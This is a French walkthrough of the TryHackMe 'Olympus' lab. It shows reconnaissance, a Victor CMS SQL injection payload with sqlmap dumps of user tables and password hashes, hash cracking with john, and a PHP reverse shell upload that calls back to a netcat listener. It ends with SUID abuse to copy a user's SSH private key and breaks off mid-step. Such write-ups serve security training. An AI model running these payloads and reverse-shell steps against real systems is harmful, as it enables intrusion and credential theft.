# Olympus

## Recon
### NMAP
La reconnaissance commence par un scan nmap classique avec '-sV' (Sondez les ports ouverts pour déterminer les informations de service/version) et '-sC' (équivalent à --script=default):

```bash
nmap -sC -sV 10.10.207.20

PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
|_  256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
80/tcp open  http	Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
Lors du scan initiale de nmap, nous pouvons voir que deux ports sont ouverts (**22**, **80**).
Nous pouvons ajouter le nom DNS à notre fichier **/etc/hosts** :
```bash
echo "10.10.207.20  olympus.thm" | sudo tee -a /etc/hosts
```
---
### Browse Website
Maintenant, on peut parcourir la page **http://olympus.thm/** :
> http://olympus.thm
![http://olympus.thm/](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_olympus.thm.png?raw=true)
> Wappalyzer
![Wappalyzer](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_wappalyzer_olympus.thm.png?raw=true)

Nous pouvons ajouter quelques informations à nos notes :
> mail: root@the-it-departement
> user: root
> domain: the-it-departement


Avant de lancer un gobuster pour fuzzer la page principale, on peut essayer 'index.html' ou 'index.php' pour vérifier l'extension compatible :

> index.html
```bash
curl http://olympus.thm/index.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at olympus.thm Port 80</address>
</body></html>
```
> index.php
```
curl http://olympus.thm/index.php 
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta charset="utf-8">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Olympus</title>
  <!-- Meta -->
  <meta name="Content-Language" content="en">
  <meta name="Keywords" content="AperiSolve, Apérisolve, Aperi'Solve, Apéri'Solve, Zeecka">
  <meta name="Author" content="Zeecka">
  <meta name="Robots" content="all">
  <meta name="theme-color" content="#42f4c5">
  <link rel="shortcut icon" type="image/x-icon" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="icon" type="image/png" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
  <link href="http://olympus.thm/static/normalize.css" rel="stylesheet">
  <link href="http://olympus.thm/static/style.css" rel="stylesheet">
  <script src="http://olympus.thm/static/particles.min.js"></script>
</head>
<body>
  <br></br>
  <div id="parentmain">
    <div id="parenthome">
      <h1 id="logo">Olympus v2</h1>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <div id="mainform">
	<div id="file-drag">
            <div id="start">
              <div>The website is still under developpment.</div>
              <div id="notimage" class="hidden">If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.</div>
            </div>
      </div>
  <div id="particles-js"></div>
  <script>particlesJS.load('particles-js', 'http://olympus.thm/static/particles.json', function () { });</script>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</html>
```
Nous pouvons voir que l'extension **.php** fonctionne, nous pouvons donc ajouter **'-x php'** à notre commande gobuster pour trouver des fichiers **.php** :

---
### GOBUSTER

```bash
gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -x php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/01 11:09:31 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
Progress: 9120 / 9230 (98.81%)
===============================================================
2023/03/01 11:10:01 Finished
===============================================================
```

---
Nous avons trouvé un chemin:  http://olympus.thm/~webmaster/

![http://olympus.thm/~webmaster/](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_Victor_CMS.png?raw=true)

Super, nous avons trouvé des trucs intéressants, comme la fonction de **recherche** (search) et de **connexion** (login).

---
### SEARCHSPLOIT

Commençons par vérifier s'il existe des vulnérabilités '**Victor CMS**' dans **exploit-db** avec la ligne de commande **searchsploit** :

```bash
searchsploit "Victor CMS"                                         
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                                                                        | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                                                                            | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                                                                              | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                                                                            | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                                                               | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                                                                | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                                                                            | php/webapps/49282.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**Searchsploit** me montre plusieurs exploits connus, essayons d'abord l'exploit pour l'**injection SQL 'Search'**
```bash
cat /usr/share/exploitdb/exploits/php/webapps/48734.txt           
# Exploit Title: Victor CMS 1.0 - 'Search' SQL Injection
# Date: 2020-08-04
# Exploit Author: Edo Maland
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: XAMPP / Windows 10

-------------------------------------------------------------------------------------------------------------------------------------
# Discription:
# The Victor CMS v1.0 application is vulnerable to SQL injection via the 'search' parameter on the search.php page.

# Feature: Search
# Vulnerable file: search.php
# Vulnerable parameter :
	- search
# PoC

Url : http://example.com/CMSsite/search.php
Methode : Post (search="[SQLi]"&submit)

Payload : 1337'union+select+1,2,version(),database(),5,6,7,8,9,10 -- -

# Burpsuite Requests

POST /CMSsite/search.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Connection: close
Referer: http://example.com/CMSsite/search.php
Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
Upgrade-Insecure-Requests: 1

search=1337'union+select+1,2,version(),databases(),5,6,7,8,9,10%20--%20-&submit=

# Sqlmap Command

sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```


---
### BURP

Ouvrons **Burp** pour essayer l'exploit **'search' SQL Injection** :
![Burp_SQLI_search](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/BURP_search_SQLI.png?raw=true)


Ça marche !


---
### SQLMAP
Maintenant, nous pouvons exécuter sqlmap :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:53:01 /2023-03-01/

[11:53:01] [DEBUG] cleaning up configuration parameters
[11:53:01] [DEBUG] setting the HTTP timeout
[11:53:01] [DEBUG] setting the HTTP User-Agent header
[11:53:01] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.20) Gecko/20081217 Firefox(2.0.0.20)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [DEBUG] creating HTTP requests opener object
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[11:53:01] [DEBUG] used the default behavior, running in batch mode
[11:53:01] [INFO] resuming back-end DBMS 'mysql' 
[11:53:01] [DEBUG] resolving hostname 'olympus.thm'
[11:53:01] [INFO] testing connection to the target URL
[11:53:02] [DEBUG] declared web page charset 'utf-8'
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=uet6a1mao4v...fko6o9891g'). Do you want to use those [Y/n] Y
[11:53:02] [DEBUG] used the default behavior, running in batch mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=1337' OR NOT 8708=8708#&submit=
    Vector: OR NOT [INFERENCE]#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=1337' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(3391=3391,1))),0x7170627671),3391)-- RlNq&submit=
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1337' AND (SELECT 5227 FROM (SELECT(SLEEP(5)))Btsm)-- LvuX&submit=
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=1337' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767071,0x79476663707a55546148776255486644694d567a5163484b4f464f74476a49794e71766d51646153,0x7170627671),NULL,NULL,NULL#&submit=
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL#
---
[11:53:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[11:53:02] [INFO] fetching database names
[11:53:02] [DEBUG] resuming configuration option 'string' ('result')
[11:53:02] [DEBUG] performed 0 queries in 0.00 seconds
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[11:53:02] [INFO] fetched data logged to text files under '/home/rawmain/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 11:53:02 /2023-03-01/
```


Nous venons de trouver plusieurs bases de données, essayons de trouver des informations dans la base de données **olympus** :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --tables olympus
...
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
...
```

Nous pouvons essayer d'imprimer la table '**flag**' :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T flag
...
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{***Flag***} |
+---------------------------+
...
```

**Super! Nous avons trouvé le premier Flag !**

Restons concentrés et continuons à chercher d'autres informations dans la base de données, comme la table '**users**' :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T users
...
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6***** | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4***** | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJ***** | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```


---
Nous venons de trouver quelques informations intéressantes : 
- **Users** :
	- prometheus
	- root
	- zeus
- **Mail addresses**:
	- prometheus@olympus.thm
	- root@chat.olympus.thm
	- zeus@chat.olympus.thm
- **Users passwords hash**:
	- $2y$10$YC6*****
	- $2y$10$lcs4*****
	- $2y$10$cpJ*****
- **New subdomain**:
	- chat.olympus.thm

Nous créons un fichier **users.hash** qui contient les hachages des utilisateurs pour essayer de les cracker plus tard.

```bash
cat users_hash.txt                                          
$2y$10$YC6*****
$2y$10$lcs*****
$2y$10$cpJ*****
```

Ajoutez le nouveau sous-domaine à notre fichier **/etc/hosts** :

```bash
cat /etc/hosts

# tryHackMe
10.10.207.20  olympus.thm chat.olympus.thm
```

Ajoutez les utilisateurs présents dans un fichier **databaseUsers.txt** :

```bash
cat databaseUsers.txt                             
prometheus
root
zeus
```


---
### HASHID
Nous pouvons identifier le format de hachage avec **hashid** :
```bash
hashid users_hash.txt
--File 'hash/users_hash.txt'--
Analyzing '$2y$10$YC6*****'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$lcs*****'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$cp*****'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash/users_hash.txt'-- 
```


---
### JOHN
Crack **users_hash.txt** file:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt users_hash.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s********e       (?)   
...
```

---
John a cracké un hash, on peut essayer de se connecter à la page **chat.olympus.thm** avec ces creds :
> user: prometheus
> password: s********e

### Webpage Login: http://olympus.thm/~webmaster/admin/
![Login_webmaster Page](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_webmaster_login.png?raw=true)

![Succes webmaster_Login !](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_webmasterAdminPage.png?raw=true)


### Webpage Login: http://chat.olympus.thm/home.php

![Login chat.olympus_Page](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_Login_chat.png?raw=true)

![Succes chat.olympus_Login !](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_Olympus_chatApp.png?raw=true)


---
---
### GOBUSTER
*http://chat.olympus.thm/*
```bash
gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/01 13:44:47 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 281]

```

---
donc, récapitulons :
- nous avons une page web où nous pouvons **télécharger un fichier** : http://chat.olympus.thm/home.php
- nous avons trouvé le **chemin** vers le **fichier téléchargé** : http://chat.olympus.thm/uploads/

L'étape suivante consiste à vérifier si nous pouvons uploader un fichier .php qui contiendrait un reverseshell, puis essayer d'y accéder dans le dossier des téléchargements.

---
### PHP REVERSE SHELL
- Récupérez le reverse shell php de PentestMonkey : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Vérifiez votre ip avec ifconfig :
 ```bash
ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.18.48.143  netmask 255.255.128.0  destination 10.18.48.143
        inet6 fe80::d061:90af:e69e:7d86  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 553269  bytes 254033107 (242.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 540631  bytes 78222105 (74.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
- Change the IP and the Port in the php_reverse_shell.php :
```bash
$ip = '10.18.48.143';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
- Upload php_reverse_shell.php:
![Upload_reverse_shell](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_ReverseShellUpload.png?raw=true)
![Upload_reverse_shell_Succes](https://github.com/RawMain121/writeups/blob/main/tryHackMe/room/Olympus/data/HTTP_ReverseShellUpload_Succes.png?raw=true)



### CURL
Eh bien, nous avons téléchargé le **php_reverse_shell.php**, nous devons maintenant trouver le fichier dans le chemin **http://chat.olympus.thm/uploads/**
Malheureusement, la page ne renvoie rien.
```bash
curl http://chat.olympus.thm/uploads/ -v3
Warning: Ignores instruction to use SSLv3
*   Trying 10.10.207.20:80...
* Connected to chat.olympus.thm (10.10.207.20) port 80 (#0)
> GET /uploads/ HTTP/1.1
> Host: chat.olympus.thm
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 01 Mar 2023 13:10:35 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Fri, 25 Mar 2022 09:19:54 GMT
< ETag: "0-5db0777349cbc"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host chat.olympus.thm left intact
```
---
Nous pouvons rechercher des informations pour comprendre le fonctionnement du téléchargement. essayons d'exploiter l'Injection SQL trouvée précédemment :

### SQLMAP
```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent --batch --dump -T chats -D olympus
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:15:27 /2023-03-01/

[14:15:27] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-us) AppleWebKit/525.7 (KHTML, like Gecko) Version/3.1 Safari/525.7' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[14:15:27] [INFO] resuming back-end DBMS 'mysql' 
[14:15:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=jdlecfqkvv0...ralefvvp30'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=1337' OR NOT 8708=8708#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=1337' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(3391=3391,1))),0x7170627671),3391)-- RlNq&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1337' AND (SELECT 5227 FROM (SELECT(SLEEP(5)))Btsm)-- LvuX&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=1337' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767071,0x79476663707a55546148776255486644694d567a5163484b4f464f74476a49794e71766d51646153,0x7170627671),NULL,NULL,NULL#&submit=
---
[14:15:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.6
[14:15:28] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[14:15:28] [INFO] fetching columns for table 'chats' in database 'olympus'
[14:15:28] [INFO] fetching entries for table 'chats' in database 'olympus'
Database: olympus
Table: chats
[5 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
| 2023-03-01 | Upload_reverse_shell                                                                                                                                            | <blank>                              | prometheus |
| 2023-03-01 | Attached : php_reverse_shell.php                                                                                                                                | 8a29591b2bbf854d5f90d9fbec61d3d4.php | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

[14:15:28] [INFO] table 'olympus.chats' dumped to CSV file '/home/freekali/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
[14:15:28] [INFO] fetched data logged to text files under '/home/freekali/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 14:15:28 /2023-03-01/
```
Ok, nous avons trouvé le fichier 'php_reverse_shell.php', le fichier uploadé porte un nom différent :
**8a29591b2bbf854d5f90d9fbec61d3d4.php**

---
Avant d'accéder au fichier, on lance un netcat pour recevoir le reverse shell :
### NETCAT
```bash
nc -lnvp 1337
listening on [any] 1337 ...
```
### CURL 
```bash
curl http://chat.olympus.thm/uploads/8a29591b2bbf854d5f90d9fbec61d3d4.php
```
### REVERSE SHELL 
```bash
nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.18.48.143] from (UNKNOWN) [10.10.207.20] 49132
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 13:20:10 up  4:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
$ 
```
**NOUS AVONS UN REVERSE SHELL !**

---
Restons concentré, il nous faut un Full TTYs Shell: 
```bash
$ bash -i
bash: cannot set terminal process group (762): Inappropriate ioctl for device
bash: no job control in this shell
www-data@olympus:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Dans la session netcat, exécutez CTRL+Z et collez ceci *(modifiez la taille de votre terminal)* :
```bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 65 columns 170; reset;
```
Ensuite, lancez ```bash -i``` pour obtenir un shell TTYs complet.

Nous pouvons essayer de trouver des informations dans le répertoire zeus :
```bash
www-data@olympus:/$ cd home/zeus/
www-data@olympus:/home/zeus$ ls
snap  user.flag  zeus.txt
www-data@olympus:/home/zeus$ cat user.flag 
flag{***Flag***}
www-data@olympus:/home/zeus$ 
```

**Génial**, nous avons trouvé un autre Flag !


---
# PRIVESC

J'exécute généralement un **linPEAS**, mais j'essaie d'abord d'énumérer manuellement avec cette commande :

```find / -perm -u=s -type f 2>/dev/null```

```bash
www-data@olympus:/home/zeus$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/snap/snapd/15534/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core20/1434/usr/bin/chfn
/snap/core20/1434/usr/bin/chsh
/snap/core20/1434/usr/bin/gpasswd
/snap/core20/1434/usr/bin/mount
/snap/core20/1434/usr/bin/newgrp
/snap/core20/1434/usr/bin/passwd
/snap/core20/1434/usr/bin/su
/snap/core20/1434/usr/bin/sudo
/snap/core20/1434/usr/bin/umount
/snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1434/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
```

```bash
www-data@olympus:/home/zeus$ ls -la /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

**cputils** est vraiment intéressant car il peut être exécuté en tant que **zeus** et sa fonctionnalité consiste à copier des fichiers: 
```bash
www-data@olympus:/home/zeus$ cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: ./.ssh/id_rsa

Enter the Name of Target File: id_rsa

File copied successfully.
www-data@olympus:/home/zeus$ ls
id_rsa	snap  user.flag  zeus.txt
www-data@olympus:/home/zeus$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
....SNIPPED....
obq72Vv1+3rNBeyjesIm6K7LhgDBA2EA9hRXeJgKDaGXaZ8qsJYbCl4O0zhShQnMXde875
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
```

Copions cette clé dans ma machine et lançons ssh2john pour créer un bon hachage pour john :
```bash 
ssh2john id_rsa > ssh_hash
```
```bash
cat ssh_hash 
